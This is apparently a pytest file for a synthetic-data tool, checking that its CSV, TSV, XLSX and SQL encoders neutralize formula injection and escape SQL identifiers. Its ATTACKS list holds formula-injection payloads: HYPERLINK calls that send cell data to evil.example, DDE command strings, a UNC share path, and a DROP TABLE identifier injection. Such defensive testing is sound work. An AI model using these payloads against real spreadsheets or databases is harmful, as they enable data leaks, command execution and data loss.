"""Output-injection guards: F-07 (spreadsheet formulas) and F-08 (SQL identifiers).

chaff never opens the files it writes, so neither of these can hurt chaff. The
impact lands entirely on the consumer — the colleague who opens the CSV in
Excel, the DBA who runs the .sql. Both are reachable because a spec is a
shareable artifact: person A writes the spec, person B generates and opens it.

Every attack string here is either the red team's own proof or a variant of it.
"""

from __future__ import annotations

import csv
import io
import json

import pytest

from chaff.engine import encode_view, generate_records, run
from chaff.formats import get_encoder, list_formats
from chaff.formats._formula import guard_mode, is_formula, neutralize
from chaff.spec import load_spec

# ── helpers ──────────────────────────────────────────────────────────

FORMULA_LEADS = ("=", "+", "-", "@", "\t", "\r")


def spec(fmt="csv", columns=("v",), options=None, name="t", rows=1):
    return load_spec({
        "name": name, "rows": rows, "seed": 1,
        "columns": [{"name": c, "generator": "choice", "params": {"values": ["x"]}}
                    for c in columns],
        "output": {"format": fmt, "options": options or {}},
        "sink": {"sink": "file", "options": {"path": "out/t"}},
    })


def csv_cells(payload: bytes):
    return list(csv.reader(io.StringIO(payload.decode())))


# The red team's proof plus every other way to reach outside a cell.
ATTACKS = [
    '=HYPERLINK("http://evil.example/"&A1,"click")',   # the report's proof
    "=cmd|'/c calc'!A1",                                # DDE
    "@SUM(1+1)",                                        # legacy @-function lead
    "\t=1+1",                                           # tab-led formula
    "\r=1+1",                                           # CR-led formula
    '+HYPERLINK("http://evil.example/","c")',           # + lead, function call
    '-2+HYPERLINK("http://evil.example/","c")',         # - lead, function call
    "+cmd|'/c calc'!A1",                                # + lead, DDE pipe
    "-'\\\\evil\\share\\x'!A1",                         # - lead, UNC path
    "+Sheet2!A1",                                       # + lead, sheet reference
]

# Values a demo dataset actually contains. Measured across the twelve example
# specs: 131 of 52,658 generated strings begin with a formula lead and every
# one is a phone number. Escaping these would put "'+1-289-253-5482x18761" in
# the CRM preset, so they are the regression this guard must not cause.
BENIGN = [
    "+1-289-253-5482x18761",
    "+1-341-672-6998",
    "+1 (555) 123-4567",
    "-42",
    "-3.14",
    "Acme, Inc.",
    "jane@example.com",
    "",
]


# ── F-07: the guard's rule ───────────────────────────────────────────

@pytest.mark.parametrize("value", ATTACKS)
def test_every_attack_is_recognized_as_a_formula(value):
    assert is_formula(value, "smart")


@pytest.mark.parametrize("value", BENIGN)
def test_no_benign_demo_value_is_recognized_as_a_formula(value):
    assert not is_formula(value, "smart")


def test_strict_mode_catches_the_leads_smart_deliberately_allows():
    # The documented difference between the two modes, stated as a test so it
    # can't drift: strict escapes an inert phone number, smart does not.
    assert is_formula("+1-555-0100", "strict")
    assert not is_formula("+1-555-0100", "smart")


def test_off_mode_recognizes_nothing():
    assert not any(is_formula(a, "off") for a in ATTACKS)


def test_numbers_are_never_quoted():
    # A negative int is a number in every encoder that calls neutralize;
    # quoting it would turn numeric data into text.
    for value in (-42, -3.14, 0, True, None):
        assert neutralize(value, "strict") == value


def test_an_unknown_guard_mode_raises_rather_than_defaulting():
    # A typo that silently disabled the guard would be a guard that reads as
    # enabled and is not.
    with pytest.raises(ValueError, match="formula_guard must be one of"):
        guard_mode({"formula_guard": "stict"})


def test_the_default_mode_is_smart():
    assert guard_mode({}) == "smart"


# ── F-07: the delimited encoders ─────────────────────────────────────

@pytest.mark.parametrize("fmt", ["csv", "tsv"])
def test_no_attack_survives_as_a_formula_in_a_delimited_file(fmt):
    payload = get_encoder(fmt)(spec(fmt, rows=len(ATTACKS)),
                               [{"v": a} for a in ATTACKS])
    body = csv_cells(payload)[1:] if fmt == "csv" else None
    text = payload.decode()
    if fmt == "tsv":
        body = [line.split("\t") for line in text.split("\n")[1:] if line]
    leading = [c[0] for c in body if c and c[0][:1] in FORMULA_LEADS]
    assert leading == [], f"still formula-leading: {leading}"


def test_benign_demo_values_pass_through_a_csv_unchanged():
    payload = get_encoder("csv")(spec(rows=len(BENIGN)), [{"v": b} for b in BENIGN])
    assert [c[0] for c in csv_cells(payload)[1:]] == BENIGN


def test_a_formula_in_a_column_name_is_neutralized_too():
    # Headers are attacker-reachable the same way values are.
    name = "=cmd|'/c calc'!A1"
    payload = get_encoder("csv")(spec(columns=(name,)), [{name: "v"}])
    assert csv_cells(payload)[0] == ["'" + name]


def test_strict_mode_escapes_a_phone_number_and_smart_does_not():
    phone = "+1-555-0100"
    strict = get_encoder("csv")(spec(options={"formula_guard": "strict"}),
                                [{"v": phone}])
    smart = get_encoder("csv")(spec(), [{"v": phone}])
    assert csv_cells(strict)[1] == ["'" + phone]
    assert csv_cells(smart)[1] == [phone]


def test_off_mode_is_a_real_escape_hatch():
    payload = get_encoder("csv")(spec(options={"formula_guard": "off"}),
                                 [{"v": ATTACKS[0]}])
    assert csv_cells(payload)[1] == [ATTACKS[0]]


def test_the_streaming_csv_record_encoder_is_guarded_too():
    # A streamed record is as likely to be pasted into a spreadsheet as a
    # downloaded file; guarding only the whole-file encoder would leave half
    # the surface open.
    from chaff.formats import get_record_encoder
    out = get_record_encoder("csv")(spec(), {"v": ATTACKS[0]}).decode()
    assert out.startswith('"\'=HYPERLINK')


def test_a_delimited_row_with_an_undeclared_column_still_raises():
    # csv.DictWriter used to raise here. Dropping the column silently would
    # produce a file that looks complete and isn't.
    with pytest.raises(ValueError, match="not declared in the spec"):
        get_encoder("csv")(spec(), [{"v": "a", "surprise": "b"}])


def test_delimited_output_follows_spec_column_order_not_row_key_order():
    s = spec(columns=("a", "b"))
    payload = get_encoder("csv")(s, [{"b": 2, "a": 1}])
    assert csv_cells(payload) == [["a", "b"], ["1", "2"]]


# ── F-07: the Excel encoder ──────────────────────────────────────────

def test_xlsx_stores_a_formula_string_as_a_string():
    openpyxl = pytest.importorskip("openpyxl")
    payload = get_encoder("xlsx")(spec("xlsx", rows=len(ATTACKS)),
                                  [{"v": a} for a in ATTACKS])
    ws = openpyxl.load_workbook(io.BytesIO(payload)).active
    types = [c.data_type for row in ws.iter_rows(min_row=2) for c in row]
    assert types.count("f") == 0, "a cell is still typed as a formula"


def test_xlsx_neutralizes_without_mangling_the_value():
    # The .xlsx fix is strictly better than the CSV one: forcing the cell type
    # keeps the exact text with no apostrophe, so even strict mode is invisible.
    openpyxl = pytest.importorskip("openpyxl")
    payload = get_encoder("xlsx")(spec("xlsx", options={"formula_guard": "strict"},
                                       rows=len(BENIGN)),
                                  [{"v": b} for b in BENIGN])
    ws = openpyxl.load_workbook(io.BytesIO(payload)).active
    values = [c.value for row in ws.iter_rows(min_row=2) for c in row]
    assert [v or "" for v in values] == BENIGN


def test_xlsx_sets_quote_prefix_so_re_entry_keeps_it_text():
    openpyxl = pytest.importorskip("openpyxl")
    payload = get_encoder("xlsx")(spec("xlsx"), [{"v": ATTACKS[0]}])
    ws = openpyxl.load_workbook(io.BytesIO(payload)).active
    assert ws.cell(row=2, column=1).quotePrefix is True


def test_xlsx_off_mode_still_writes_a_formula():
    openpyxl = pytest.importorskip("openpyxl")
    payload = get_encoder("xlsx")(spec("xlsx", options={"formula_guard": "off"}),
                                  [{"v": ATTACKS[0]}])
    ws = openpyxl.load_workbook(io.BytesIO(payload)).active
    assert ws.cell(row=2, column=1).data_type == "f"


# ── F-08: SQL identifier escaping ────────────────────────────────────

INJECTION = 'x]"; DROP TABLE audit;--'


@pytest.mark.parametrize("dialect", ["tsql", "postgres", "sqlite"])
def test_an_injected_identifier_cannot_escape_its_quoting(dialect):
    s = spec("sql", columns=(INJECTION,), options={"dialect": dialect},
             name=INJECTION)
    sql = get_encoder("sql")(s, [{INJECTION: "v"}]).decode()
    # The statement must contain no unescaped delimiter, i.e. the injected
    # text never becomes a statement of its own.
    for line in sql.split("\n"):
        if line.startswith("CREATE TABLE") or line.startswith("INSERT INTO"):
            assert "DROP TABLE audit" in line  # the text is present, as data
            assert not line.rstrip().endswith("audit;--")  # but not as SQL


def test_tsql_doubles_a_closing_bracket():
    s = spec("sql", columns=("c]x",), options={"dialect": "tsql"}, name="t]x")
    sql = get_encoder("sql")(s, [{"c]x": "v"}]).decode()
    assert "[t]]x]" in sql
    assert "[c]]x]" in sql


def test_ansi_dialects_double_a_closing_double_quote():
    s = spec("sql", columns=('c"x',), options={"dialect": "postgres"}, name='t"x')
    sql = get_encoder("sql")(s, [{'c"x': "v"}]).decode()
    assert '"t""x"' in sql
    assert '"c""x"' in sql


def test_the_red_team_proof_no_longer_yields_a_bare_drop_statement():
    name = "x]; DROP TABLE audit;--"
    s = spec("sql", columns=("c",), options={"dialect": "tsql"}, name=name)
    sql = get_encoder("sql")(s, [{"c": "v"}]).decode()
    assert "CREATE TABLE [x]]; DROP TABLE audit;--]" in sql
    assert "CREATE TABLE [x]; DROP TABLE audit;--]" not in sql


# ── entity columns reaching column-oriented encoders ─────────────────
# Found while rewriting _delimited: the engine adds an entity's id and tick
# columns to every snapshot, but the spec never declares them, so a
# column-oriented encoder either dropped them or refused the row.

def entity_spec(fmt="csv"):
    return load_spec({
        "name": "lifecycle", "rows": 1, "seed": 7,
        "columns": [{"name": "status", "generator": "choice",
                     "params": {"values": ["placed"]}}],
        "entity": {"count": 2, "ticks": 2, "id_column": "order_id",
                   "tick_column": "step"},
        "output": {"format": fmt, "options": {}},
        "sink": {"sink": "file", "options": {"path": "out/e"}},
    })


def test_entity_id_and_tick_reach_a_csv():
    s = entity_spec()
    payload = get_encoder("csv")(encode_view(s), generate_records(s))
    assert csv_cells(payload)[0] == ["order_id", "step", "status"]


def test_entity_id_and_tick_reach_a_sql_table():
    s = entity_spec("sql")
    sql = get_encoder("sql")(encode_view(s), generate_records(s)).decode()
    assert '"order_id"' in sql and '"step"' in sql


def test_encode_view_leaves_a_plain_spec_alone():
    s = spec()
    assert encode_view(s) is s


def test_every_example_spec_generates_and_encodes(tmp_path):
    """The gap that hid the entity bug: `make check` validates the presets but
    never generates one, so a preset that cannot be encoded still reads green.
    """
    import glob
    failures = []
    for path in sorted(glob.glob("examples/*.json")):
        data = json.loads(open(path).read())
        data["sink"] = {"sink": "file", "options": {"path": str(tmp_path / "o")}}
        for key in ("rows", "entity"):
            if key == "rows" and "rows" in data:
                data["rows"] = min(data["rows"], 25)
            if key == "entity" and data.get("entity"):
                data["entity"]["count"] = min(data["entity"]["count"], 3)
                data["entity"]["ticks"] = min(data["entity"]["ticks"], 3)
        try:
            run(load_spec(data))
        except Exception as e:  # noqa: BLE001 - report every failure at once
            failures.append(f"{path}: {type(e).__name__}: {e}")
    assert failures == [], "example specs that cannot be generated:\n" + "\n".join(failures)
